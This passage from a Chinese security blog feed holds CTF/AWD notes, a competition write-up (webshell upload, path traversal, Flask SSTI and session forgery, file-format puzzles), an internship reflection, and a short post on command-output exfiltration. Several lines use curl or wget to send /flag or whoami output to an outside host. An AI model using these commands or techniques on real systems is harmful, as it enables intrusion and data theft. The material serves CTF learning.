class="line">建立一个软连接，然后通过5555端口访问ssh服务</span><br></pre></td></tr></table></figure><p>还有一种操作就是curl外带本地命令执行结果,这个也可以写到crontab里面，比较方便的使用提交flag的api提交flag。示例如下</p><p>curl “http://:7777?flag=$(cat /flag)”</p><h1 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h1><p>用来迷惑对手</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;</span><br><span class="line">alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安网杯部分wp</title>
      <link href="2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/"/>
      <url>2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>webshell上传</p><p>前端绕过。绕了半天才想起来是前端绕过。。burp改个后缀就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">代码</span><br><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到shell 蚁剑上传 cat /flag</p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><a href="http://172.20.2.4:9003/index.php?txt=../../../flag">http://172.20.2.4:9003/index.php?txt=../../../flag</a> 任意文件读取，秒了</p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p>知识点：SSTI,SSTI读配置文件，/proc目录的作用，flask session伪造</p><p>首先，尝试登录172.20.2.3:9006,登录失败，访问了一下robots.txt,发现了有报错信息，观察URL，考虑可能存在XSS，</p><p>image-20210511155722690.png<img src="http://cdn.polowong.top/1620813539140l7b6j4e6.png?imageslim" alt="paste image"><br>这里看了一眼中间件分析结果，发现了flask。。flask人狂喜（。</p><p>直接4</p><p>image-20210511155809022.png<img src="http://cdn.polowong.top/1620813548564ty2uanbr.png?imageslim" alt="paste image"><br>懂得都懂，铁ssti了，尝试一步步rce，检测发现没开debug模式，所以只能走常规的rce利用了。</p><p>当尝试到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure><p>时发现被ban了，单独测试了下小括号，发现是ban了小括号。既然ban了小括号，那么常规的ssti rce基本就走不通了。只能考虑读取一些敏感文件，比如config，使用payload  读取config文件，发现了 secret_key</p><p>image-20210511160014837.png<img src="http://cdn.polowong.top/16208135773438gjedayy.png?imageslim" alt="paste image"></p><p>secret_key的作用是生成session，具体步骤我忘了，反正是根据secret_key可以还原和生成对应的session。</p><p>github有对应的工具，flask session manager。</p><p>接下来看了看源码，<br>image-20210511160246157.png<img src="http://cdn.polowong.top/1620813563588zor9il2b.png?imageslim" alt="paste image"></p><p>一个简单的前端验证，burp抓返回包把0改成1就行，这样就顺利进入后台了。但是进入后台后提示我不是admin（2333</p><p>image-20210511160330889.png<img src="http://cdn.polowong.top/16208136016557e3ok72r.png?imageslim" alt="paste image"></p><p>好吧，看起来是要伪造admin的session了。现在secret_key有了，用工具先解密当前session，把用户名改成admin后再生成session。如下图所示</p><p>image-20210511160731351.png<img src="http://cdn.polowong.top/1620813610364ajp4gund.png?imageslim" alt="paste image"></p><p>那么当前生成的admin的session就是eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5o，edit this cookie 换一下（我这chrome有bug，用的firefox）</p><p>image-20210511160841881.png<img src="http://cdn.polowong.top/16208136158740qcqf1gf.png?imageslim" alt="paste image"></p><p>已经给了hint，考虑任意文件读取，首先尝试读取/etc/passwd，成功。</p><p>image-20210511161046827.png<img src="http://cdn.polowong.top/16208136213232flk4by2.png?imageslim" alt="paste image"></p><p>接下来尝试读flag。直接/flag不行，关键字给过滤了。卡了好几个小时</p><p>用了挺多绕过方法 /fla? /f* 等等 但是可能中间有转义之类的，最终传到Linux层并不能识别通配符，所以卡了很长时间</p><p>最后的思路是之前比赛中读flag，过滤了很多，师傅告诉我利用/proc/目录读文件，proc目录代表了与当前运行进程有关的信息并以文件的形式展示（学习链接：<a href="https://blog.csdn.net/qq_45521281/article/details/114594402%EF%BC%89%EF%BC%8C%E8%80%8C/proc/self%E7%9B%AE%E5%BD%95%E4%BB%A3%E8%A1%A8%E4%BA%86%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%9C%89%E5%85%B3%E4%BF%A1%E6%81%AF%E5%B9%B6%E4%BB%A5%E6%96%87%E4%BB%B6%E7%9A%84%E5%BD%A2%E5%BC%8F%E5%B1%95%E7%A4%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E6%9C%89fd%E3%80%81cmdline%E3%80%81cwd%E3%80%81envrion%E7%AD%89%E3%80%82">https://blog.csdn.net/qq_45521281/article/details/114594402），而/proc/self目录代表了当前进程的有关信息并以文件的形式展示，需要注意的有fd、cmdline、cwd、envrion等。</a></p><p>/proc/self/cmdline 代表当前的命令行输入内容，我读取了之后是这个</p><p>image-20210511161330178.png<img src="http://cdn.polowong.top/1620813626597i04733zp.png?imageslim" alt="paste image"></p><p>好家伙 绝对路径有了，直接读文件</p><p>/app/app_a384gh1.py</p><p>程序代码如下，基本修复了ssti-&gt;rce，然后看到了import  ffffffff111llllag 文件，那直接读当前/app目录下的ffffffff111llllag.py就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,redirect,render_template,session</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ffffffff111llllag</span><br><span class="line"></span><br><span class="line">app = Flask(import_name=__name__,template_folder=<span class="string">&#x27;templates&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>,static_url_path=<span class="string">&#x27;/static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/admin/&#x27;</span> <span class="keyword">in</span> request.path:</span><br><span class="line">        sess_name=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(session)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">            sess_name=session[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> sess_name!=<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your current account is &#x27;</span>+sess_name+<span class="string">&#x27; not admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeheader</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.headers[<span class="string">&quot;X-Powered-By&quot;</span>] = <span class="string">&quot;PHP/7.2.10&quot;</span></span><br><span class="line">    response.headers[<span class="string">&quot;Hint&quot;</span>] = <span class="string">&quot;Wake up Neo, the Matrix has you&quot;</span></span><br><span class="line">    response.headers[<span class="string">&#x27;Server&#x27;</span>]=<span class="string">&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redirect_2_index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not in session!&#x27;</span>)</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>]=<span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;./index.php&quot;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/err.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">err</span>():</span></span><br><span class="line">    <span class="comment">#I patched the SSTI vulnerability.How clever I am!</span></span><br><span class="line">    errorinfo=request.args.get(<span class="string">&quot;errorinfo&quot;</span>)</span><br><span class="line">    blacklist=[<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> errorinfo:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot;</span> % errorinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login.php&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> username <span class="keyword">or</span> <span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin/backendmanage.php&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backendmanage</span>():</span></span><br><span class="line">    img=request.args.get(<span class="string">&quot;img&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> img:</span><br><span class="line">        img=<span class="string">&#x27;1.png&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> img:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot;</span></span><br><span class="line">    content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(img, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> img_f:</span><br><span class="line">        content = img_f.read()</span><br><span class="line">        content = base64.b64encode(content)</span><br><span class="line">    content=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> content])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;Current Image:&#123;img&#125;&lt;/h1&gt;&lt;!-- ?img=1.png --&gt;&lt;img  src=&quot;data:;base64,&#123;content&#125;&quot;&gt;&#x27;</span>.<span class="built_in">format</span>(img=img,content=content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params">Exception</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all_exception_handler</span>(<span class="params">e</span>):</span></span><br><span class="line">    e=<span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/err.php?errorinfo=&quot;</span>+e, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读取flag文件后，拿到flag。</p><p>image-20210511161628308.png<img src="http://cdn.polowong.top/1620813641263aqv49hf6.png?imageslim" alt="paste image"></p><p>这题有几个坑点，首先是HTTP头里面的PHP HEADER 容易迷惑人，其次是登录那的sql注入容易迷惑人，最后是FLASK-SSTI的利用方式需要掌握全面：</p><p>1.直接RCE</p><p>2.开DEBUG时，SSTI 读文件-&gt;构造PIN码-&gt;RCE</p><p>3.伪造session登录</p><h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><p>流量包没看出来啥，直接分离http对象发现了flag.php，压缩包被破坏了，修复下头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">JPEG (jpg)，                        　　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　</span><br><span class="line">PNG (png)，                       　　 文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82</span><br><span class="line">GIF (gif)，                           　　文件头：47494638　　　　　　　　　　　　　　　　　　　　　　文件尾：00 3B                                                                 ZIP Archive (zip)，                     文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：50 4B</span><br><span class="line"></span><br><span class="line">TIFF (tif)，                           　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Windows Bitmap (bmp)，      　  文件头：424D　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：</span><br><span class="line">CAD (dwg)，                        　  文件头：41433130　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Adobe Photoshop (psd)，          文件头：38425053　　　　　　　　　　　　　　　　　　　　　　文件尾：</span><br><span class="line">Rich Text Format (rtf)，             文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：</span><br><span class="line">XML (xml)，                              文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：</span><br><span class="line">HTML (html)，                           文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，     文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，            文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，                         文件头：2142444E</span><br><span class="line">MS Word&#x2F;Excel (xls.or.doc)，      文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，                    文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，                  文件头：FF575043</span><br><span class="line">Adobe Acrobat (pdf)，               文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，                         文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，         文件头：E3828596</span><br><span class="line"></span><br><span class="line">RAR Archive (rar)，                    文件头：52617221</span><br><span class="line">Wave (wav)，                            文件头：57415645</span><br><span class="line">AVI (avi)，                                 文件头：41564920</span><br><span class="line">Real Audio (ram)，                     文件头：2E7261FD</span><br><span class="line">Real Media (rm)，                       文件头：2E524D46</span><br><span class="line">MPEG (mpg)，                           文件头：000001BA</span><br><span class="line">MPEG (mpg)，                           文件头：000001B3</span><br><span class="line">Quicktime (mov)，                     文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，               文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，                              文件头：4D546864</span><br></pre></td></tr></table></figure><p>image-20210512132636816.png<img src="http://cdn.polowong.top/1620813669182k7qlq11e.png?imageslim" alt="paste image"></p><p>提取rar</p><p>image-20210512132807911.png<img src="http://cdn.polowong.top/16208136734786pvpwoic.png?imageslim" alt="paste image"></p><p>十六进制转ascii</p><p>flag{My_Name_is_AoBai}</p><h1 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h1><p>zip文件头修复</p><p>得到密文5a6e4665536e506248206579666b7b39733930733833742d393637312d3433626a2d616f69302d3235663176393138707030377d</p><p>十六进制转ascii</p><p>ZnFeSnPbH<br>eyfk{9s90s83t-9671-43bj-aoi0-25f1v918pp07}</p><p>维吉尼亚解密（captfencoder1.x版本 维吉尼亚解密有bug）</p><p>flag{9a90f83e-9671-43ac-bbd0-25b1d918ca07}</p><h1 id="misc-3"><a href="#misc-3" class="headerlink" title="misc 3"></a>misc 3</h1><p>压缩包头部修复，修改错了的1位</p><p>然后需要密码，直接binwalk分离出来一个Linux可执行文件，到这里卡住了。。然后后面看了看文件头应该是个png，zhiweilai加上png的为文件头后发现图片宽高有问题，Linux打不开，用脚本爆破宽高修改即可。</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                width1=binascii.b2a_hex(width)</span><br><span class="line">                width1=width1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                width1=<span class="built_in">int</span>(width1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(width,width1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                height1=binascii.b2a_hex(height)</span><br><span class="line">                height1=height1.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">                height1=<span class="built_in">int</span>(height1,<span class="number">16</span>)</span><br><span class="line">                <span class="built_in">print</span>(height,height1)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在对应的位置修改图片宽高的十六进制值即可。</p><p>image-20210512175308222.png<img src="http://cdn.polowong.top/16208136581593aoz2hnd.png?imageslim" alt="paste image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>实习&amp;季度总结</title>
      <link href="2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>2021/04/23/%E5%AE%9E%E4%B9%A0-%E5%AD%A3%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天是2021年4月29日，刚结束某市hw项目，做完这个项目，我的实习生活基本算是结束了。还在高铁上，趁着这个时间总结下这四个月的实习&amp;项目生活。</p></blockquote><h2 id="金山云实习"><a href="#金山云实习" class="headerlink" title="金山云实习"></a>金山云实习</h2><p>今年一月份，开始了在金山云实习的日子，总计约三个月，其实干活的时间也就四十来天，中间算上过年、请假什么的，所以日子就比较少了。和同事们的相处很愉快，领导是搞技术的，相处起来非常舒服。在金山的这段时间还算是比较快乐的，虽然累了一点，但是收获相对还不错。在金山，首先是在做项目的过程中学到了一些知识，渗透的思路、测试方法啥的，我觉得这些比较重要，其次是在公司钓鱼的项目中学到了红队知识，并且开启了我对红队向往的大门。<br>在公司，我学到了一些简单的免杀技巧，并且还会继续钻研；接触到了钓鱼邮件伪造，目前还在学习；Badusb上线CS马，这个已经实现了。还有就是基本的应急响应技能，在公司我独立处理了一起应急响应事件，我觉得真的是很棒的实践机会。最后是社交方面，认识了一些朋友。其他虚无缥缈的不说了，只说些实际的。</p><h2 id="hw蓝队"><a href="#hw蓝队" class="headerlink" title="hw蓝队"></a>hw蓝队</h2><p>今年hw去了青藤，本来签了深蓝，深蓝的负责人对我也很好，但是后面出了点事情，所以我就给鸽了…不管怎么说，感谢硕哥给我机会，弟弟铭记在心。说实在的，hw我是夜班，主要是看HIDS设备告警，被地方的给搞烦了，经常有误报，白天的同时也很辛苦，我觉得我夜班还是非常幸运的，就是身体上累了点。我觉得 通过这次hw 认识朋友比较重要吧，其次就是真真正正地接触了一下这种大型的安全项目，之前并没有接触过。还有就是在hw时的一些处理事情的方法，比如处置流程、权限与职责。之类的之前也只是限于理论，也更加了解了我想象中的hw和真实的hw的区别2333.</p><h2 id="hw红队"><a href="#hw红队" class="headerlink" title="hw红队"></a>hw红队</h2><p>最后打了一次县市级的hw红队，其实还是挺丢人的，我自己知道自己水平不行，但是还是想去试试。虽然朋友跟我讲了是无责的，但是打了那么烂的成绩，自己心里真的不好受。。相比于拿到工资，更多的是自责吧。当然了，在这次的红队之旅中也学到了一些东西。首先是自己的渗透思路问题，渗透思路首先是不清晰，其次是太窄。信息收集时经常有遗漏或者对这个站做了某方法的收集，到了下个站就忘了或者不想做了。。这个毛病不知道什么时候能改掉。其次是漏洞的原理掌握的不够好和漏洞类型掌握的不够多，绕waf等操作需要较强的基础性知识。就像ssti绕过一样~不管怎么说，红队来了这一趟我个人是不亏的，但是对不起朋友了。</p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>希望下次看到这篇博客，能对比写时有些进步。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行结果外带</title>
      <link href="2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/"/>
      <url>2021/04/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E5%A4%96%E5%B8%A6/</url>
      
        <content type="html"><![CDATA[<p>wget –header=”test:$(whoami)” <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a></p><img src="http://cdn.polowong.top/static/images/wget1.png"><p>whoami | curl -F “:data=@-“ <a href="http://ssti.com:5000/?username%5C=1">http://ssti.com:5000\?username\=1</a>  </p><img src="http://cdn.polowong.top/static/images/curl1.png"><p>Curl “<a href="http://ssti.com:5000/?username=&#96;whoami&#96;&quot;">http://ssti.com:5000?username=&#96;whoami&#96;&quot;</a></p><img src="http://cdn.polowong.top/static/images/curl2.png">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>badusb踩坑&amp;近期感想</title>
      <link href="2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/"/>
      <url>2021/03/29/badusb%E8%B8%A9%E5%9D%91-%E8%BF%91%E6%9C%9F%E6%84%9F%E6%83%B3/</url>
      
